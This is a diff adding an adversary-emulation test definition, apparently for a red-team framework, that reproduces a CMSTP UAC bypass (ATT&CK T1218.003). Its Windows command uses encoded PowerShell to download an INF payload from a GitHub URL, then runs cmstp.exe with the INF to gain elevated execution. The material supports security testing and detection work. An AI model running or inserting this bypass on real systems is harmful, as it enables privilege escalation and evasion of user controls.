@@ -1,0 +1,18 @@
+- id: afd248ae-af26-5971-8457-73a020320bbd
+  name: Soumaia ART Tests - CMSTP Executing UAC Bypass
+  description: Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file
+  tactic: stealth
+  technique:
+    attack_id: T1218.003
+    name: 'Signed Binary Proxy Execution: CMSTP'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAyADEAOAAuADAAMAAzAF8AdQBhAGMAYgB5AHAAYQBzAHMALgBpAG4AZgAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMgAxADgALgAwADAAMwBfAHUAYQBjAGIAeQBwAGEAcwBzAC4AaQBuAGYAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAyADEAOAAuADAAMAAzAC8AcwByAGMALwBUADEAMgAxADgALgAwADAAMwBfAHUAYQBjAGIAeQBwAGEAcwBzAC4AaQBuAGYAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAFQAMQAyADEAOAAuADAAMAAzAF8AdQBhAGMAYgB5AHAAYQBzAHMALgBpAG4AZgAiAAoA
+          )
+          cmstp.exe /s ".\T1218.003_uacbypass.inf" /au
+        payloads:
+        - T1218.003_uacbypass.inf
